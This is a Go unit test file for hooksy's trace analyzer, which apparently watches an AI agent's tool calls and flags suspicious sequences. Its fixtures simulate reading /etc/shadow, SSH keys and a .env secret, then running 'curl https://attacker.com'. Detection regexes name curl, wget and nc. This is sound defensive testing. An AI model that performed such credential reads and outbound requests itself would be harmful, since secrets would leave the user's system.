package trace

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/ihavespoons/hooksy/internal/config"
	"github.com/ihavespoons/hooksy/internal/hooks"
)

func setupTestAnalyzer(t *testing.T, rules []config.SequenceRule) (*Analyzer, *SQLiteStore, func()) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}

	analyzer := NewAnalyzer(store, rules)

	return analyzer, store, func() {
		_ = store.Close()
	}
}

func TestAnalyzerNoRules(t *testing.T) {
	analyzer, _, cleanup := setupTestAnalyzer(t, nil)
	defer cleanup()

	event := &Event{
		SessionID: "test-session",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze("test-session", event)
	if output != nil {
		t.Error("Expected nil output when no rules configured")
	}
}

func TestAnalyzerCountPattern(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:        "sensitive-file-access",
			Description: "Multiple sensitive file accesses",
			Enabled:     true,
			Severity:    "warning",
			Window:      "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "/(etc|root|\\.ssh|\\.aws)",
					},
					Count: ">=3",
				},
			},
			Decision: "ask",
			Message:  "Multiple sensitive file accesses detected",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store 2 events (below threshold)
	for i := 0; i < 2; i++ {
		event := &Event{
			SessionID: sessionID,
			EventType: hooks.PreToolUse,
			ToolName:  "Read",
			ToolInput: map[string]interface{}{
				"file_path": "/etc/passwd",
			},
			Timestamp: time.Now().Add(time.Duration(-i) * time.Minute),
		}
		if err := store.StoreEvent(event); err != nil {
			t.Fatalf("Failed to store event: %v", err)
		}
	}

	// Third event should trigger the pattern
	currentEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/etc/shadow",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, currentEvent)
	if output == nil {
		t.Fatal("Expected pattern to match with 3 events")
	}

	if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionAsk {
		t.Error("Expected 'ask' decision")
	}
}

func TestAnalyzerSequencePattern(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:        "credential-then-network",
			Description: "Reading credentials followed by network request",
			Enabled:     true,
			Severity:    "critical",
			Window:      "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PostToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "\\.env$",
					},
					Label: "credential_read",
				},
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Bash$",
					ToolInput: map[string]string{
						"command": "(curl|wget|nc)",
					},
					After: "credential_read",
				},
			},
			Decision: "deny",
			Message:  "Network request after reading credentials",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store credential read event
	credEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/app/.env",
		},
		ToolResponse: map[string]interface{}{
			"content": "API_KEY=secret123",
		},
		Timestamp: time.Now().Add(-1 * time.Minute),
	}
	if err := store.StoreEvent(credEvent); err != nil {
		t.Fatalf("Failed to store credential event: %v", err)
	}

	// Network request should trigger the sequence
	networkEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "curl https://attacker.com",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, networkEvent)
	if output == nil {
		t.Fatal("Expected sequence pattern to match")
	}

	if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionDeny {
		t.Error("Expected 'deny' decision")
	}
}

func TestAnalyzerSequencePatternNotTriggered(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "credential-then-network",
			Enabled: true,
			Window:  "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PostToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "\\.env$",
					},
					Label: "credential_read",
				},
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Bash$",
					ToolInput: map[string]string{
						"command": "(curl|wget)",
					},
					After: "credential_read",
				},
			},
			Decision: "deny",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Only network request without credential read - should not trigger
	networkEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "curl https://example.com",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, networkEvent)
	if output != nil {
		t.Error("Expected no match without credential read event")
	}
}

func TestAnalyzerWindowExpiry(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "recent-access",
			Enabled: true,
			Window:  "1m", // Very short window
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Read$",
					Count:     ">=2",
				},
			},
			Decision: "ask",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store an old event (outside window)
	oldEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/etc/passwd",
		},
		Timestamp: time.Now().Add(-5 * time.Minute), // Outside 1m window
	}
	if err := store.StoreEvent(oldEvent); err != nil {
		t.Fatalf("Failed to store event: %v", err)
	}

	// Current event alone should not trigger (only 1 event in window)
	currentEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/etc/hosts",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, currentEvent)
	if output != nil {
		t.Error("Expected no match - old event should be outside window")
	}
}

func TestAnalyzerDisabledRule(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "disabled-rule",
			Enabled: false, // Disabled
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  ".*",
					Count:     ">=1",
				},
			},
			Decision: "deny",
		},
	}

	analyzer, _, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	event := &Event{
		SessionID: "test-session",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze("test-session", event)
	if output != nil {
		t.Error("Expected nil - disabled rule should not match")
	}
}

func TestAnalyzerBlockDecision(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "block-test",
			Enabled: true,
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Dangerous$",
				},
			},
			Decision: "block",
			Message:  "Dangerous tool blocked",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, _ = store.GetOrCreateSession(sessionID, "/home/user", "")

	event := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Dangerous",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, event)
	if output == nil {
		t.Fatal("Expected pattern to match")
	}

	if output.Continue != false {
		t.Error("Expected Continue=false for block decision")
	}
}

func TestParseCount(t *testing.T) {
	tests := []struct {
		expr     string
		wantNum  int
		wantOp   string
	}{
		{">=3", 3, ">="},
		{">5", 5, ">"},
		{"<=10", 10, "<="},
		{"<2", 2, "<"},
		{"==1", 1, "=="},
		{"=4", 4, "="},
		{"3", 3, ">="}, // Just a number defaults to >=
	}

	for _, tt := range tests {
		num, op := parseCount(tt.expr)
		if num != tt.wantNum || op != tt.wantOp {
			t.Errorf("parseCount(%q) = (%d, %q), want (%d, %q)",
				tt.expr, num, op, tt.wantNum, tt.wantOp)
		}
	}
}

func TestEventMatches(t *testing.T) {
	analyzer := &Analyzer{}

	tests := []struct {
		name    string
		event   *Event
		spec    *config.SequenceEvent
		want    bool
	}{
		{
			name: "matches event type and tool",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Bash",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Bash$",
			},
			want: true,
		},
		{
			name: "wrong event type",
			event: &Event{
				EventType: hooks.PostToolUse,
				ToolName:  "Bash",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Bash$",
			},
			want: false,
		},
		{
			name: "tool name regex",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^(Read|Write)$",
			},
			want: true,
		},
		{
			name: "tool input match",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
				ToolInput: map[string]interface{}{
					"file_path": "/home/user/.ssh/id_rsa",
				},
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Read$",
				ToolInput: map[string]string{
					"file_path": "\\.ssh",
				},
			},
			want: true,
		},
		{
			name: "tool input no match",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
				ToolInput: map[string]interface{}{
					"file_path": "/home/user/readme.txt",
				},
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolInput: map[string]string{
					"file_path": "\\.ssh",
				},
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := analyzer.eventMatches(tt.event, tt.spec)
			if got != tt.want {
				t.Errorf("eventMatches() = %v, want %v", got, tt.want)
			}
		})
	}
}
